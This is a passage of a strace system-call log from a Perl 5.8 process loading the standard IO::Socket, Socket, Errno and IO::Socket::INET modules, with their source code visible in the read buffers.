($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
11808 20:20:27.083843 stat64("/etc/perl/Socket.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083862 stat64("/etc/perl/Socket.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.083875 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083888 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.083902 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083915 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.083930 stat64("/usr/lib/perl5/Socket.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083942 stat64("/usr/lib/perl5/Socket.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.083956 stat64("/usr/share/perl5/Socket.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083968 stat64("/usr/share/perl5/Socket.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.083981 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.083994 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
11808 20:20:27.084015 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.084029 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.084041 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.084060 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
11808 20:20:27.084521 brk(0x8239000)    = 0x8239000
11808 20:20:27.084732 read(8, "", 4096) = 0
11808 20:20:27.084748 close(8)          = 0
11808 20:20:27.084854 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
11808 20:20:27.084881 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11808 20:20:27.084910 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
11808 20:20:27.084925 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
11808 20:20:27.085017 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
11808 20:20:27.085036 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7daa000
11808 20:20:27.085051 mmap2(0xb7daf000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7daf000
11808 20:20:27.085072 close(8)          = 0
11808 20:20:27.085639 brk(0x825a000)    = 0x825a000
11808 20:20:27.085807 stat64("/etc/perl/Errno.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.085825 stat64("/etc/perl/Errno.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.085840 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.085853 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.085867 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.085880 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.085894 stat64("/usr/lib/perl5/Errno.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.085906 stat64("/usr/lib/perl5/Errno.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.085919 stat64("/usr/share/perl5/Errno.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.085931 stat64("/usr/share/perl5/Errno.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.085944 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.085957 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
11808 20:20:27.085978 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.085993 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.086005 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.086025 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
11808 20:20:27.086760 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
11808 20:20:27.087173 _llseek(8, 5966, [5966], SEEK_SET) = 0
11808 20:20:27.087194 _llseek(8, 0, [5966], SEEK_CUR) = 0
11808 20:20:27.087205 close(8)          = 0
11808 20:20:27.087616 brk(0x827b000)    = 0x827b000
11808 20:20:27.087760 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
11808 20:20:27.088205 _llseek(6, 6698, [6698], SEEK_SET) = 0
11808 20:20:27.088250 _llseek(6, 0, [6698], SEEK_CUR) = 0
11808 20:20:27.088264 close(6)          = 0
11808 20:20:27.088285 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.088300 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088314 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.088328 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088342 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.088355 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088370 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.088382 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088401 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.088413 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088427 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.088441 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
11808 20:20:27.088463 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.088478 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
